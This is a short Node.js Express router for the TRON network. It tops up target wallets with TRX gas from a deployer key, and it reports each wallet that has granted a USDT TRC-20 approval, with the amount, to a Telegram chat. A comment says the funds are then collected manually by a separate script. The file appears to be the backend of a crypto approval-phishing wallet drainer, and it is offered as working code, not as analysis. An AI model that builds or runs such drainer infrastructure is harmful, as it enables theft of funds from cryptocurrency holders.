import express from 'express';
import { TronWeb } from 'tronweb';
import logger from '../logger.js';

const router = express.Router();

const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS;
const USDT_TRC20       = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TOPUP_TRX        = 5_000_000;
const MIN_TRX          = 3_000_000;

const getTronWeb = () => new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: process.env.DEPLOYER_PRIVATE_KEY,
});

const sendTelegram = async (text) => {
  const token  = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
  });
  const data = await res.json();
  if (!data.ok) logger.error('Telegram error: ' + JSON.stringify(data));
};

// TRX topup
router.post('/topup', async (req, res) => {
  const { to } = req.body;
  if (!to) return res.status(400).json({ error: "Missing 'to' address" });
  try {
    const tronWeb = getTronWeb();
    const account = await tronWeb.trx.getAccount(to);
    const balance = account.balance || 0;

    if (balance >= MIN_TRX) {
      return res.json({ isNeededGas: false, status: true, txhash: null, error: null });
    }

    const tx = await tronWeb.trx.sendTrx(to, TOPUP_TRX);
    logger.info(`TRX topup sent to ${to}: ${tx.txid}`);
    res.json({ isNeededGas: true, status: true, txhash: tx.txid, error: null });
  } catch (e) {
    logger.error('Topup error: ' + e.message);
    res.json({ isNeededGas: false, status: false, txhash: null, error: e.message });
  }
});

// Sirf Telegram notify - collect script se manually hoga
router.post('/approved', async (req, res) => {
  const { address, amount } = req.body;
  if (!address) return res.status(400).json({ error: 'Address required' });

  try {
    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
    const msg  = `<b>✅ Wallet Approved (TRC-20)</b>\n\n🔑 Address: <code>${address}</code>\n💰 Amount: ${amount || 'N/A'} USDT\n🕐 Time: ${time} IST`;
    await sendTelegram(msg);
    logger.info('Telegram sent for: ' + address);
  } catch (e) {
    logger.error('Telegram notify failed: ' + e.message);
  }

  res.json({ success: true });
});

export default router;
